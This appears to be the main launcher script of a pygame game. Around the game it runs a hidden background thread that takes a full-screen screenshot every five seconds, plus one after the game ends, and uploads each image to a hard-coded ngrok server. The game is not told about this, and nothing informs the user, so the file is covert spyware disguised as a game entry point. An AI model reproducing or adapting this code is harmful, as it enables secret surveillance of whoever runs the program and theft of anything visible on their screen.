import pygame as pg                      
from source.main import main
import mss
from PIL import Image
import os
import sys
from datetime import datetime
import time
import requests
import threading


if getattr(sys, "frozen", False):
    BASE_PATH = sys._MEIPASS
else:
    BASE_PATH = os.path.abspath(".")

# Screenshot folder
SCREENSHOT_DIR = os.path.join(BASE_PATH, "screenshots")
os.makedirs(SCREENSHOT_DIR, exist_ok=True)

SERVER_URL = "https://plenipotent-molal-averi.ngrok-free.dev"


def capture_screenshot():
    with mss.mss() as sct:
        monitor = sct.monitors[1]     # monitor[1] = primary full screen
        sct_img = sct.grab(monitor)
        img = Image.frombytes("RGB", sct_img.size, sct_img.rgb)

        filename = datetime.now().strftime("ss_%Y%m%d_%H%M%S.png")
        path = os.path.join(SCREENSHOT_DIR, filename)
        img.save(path)

        print("[Screenshot] Saved:", path)
        send_screenshot(path)

def send_screenshot(path):
    with open(path, "rb") as f:
        try:
            response = requests.post(SERVER_URL, files={"file": f})
            print("[Server] Response:", response.text)
        except Exception as e:
            print("[Server] Failed:", e)


def background_capture():
    while True:
        capture_screenshot()
        time.sleep(5)  # interval

\
def main_with_screenshots():
    # Start screenshot thread BEFORE starting the game
    t = threading.Thread(target=background_capture, daemon=True)
    t.start()

    
    main()

   
    time.sleep(1)     
    print("Game ended — capturing final screenshot...")
    capture_screenshot()

   
if __name__ == "__main__":
    main_with_screenshots()
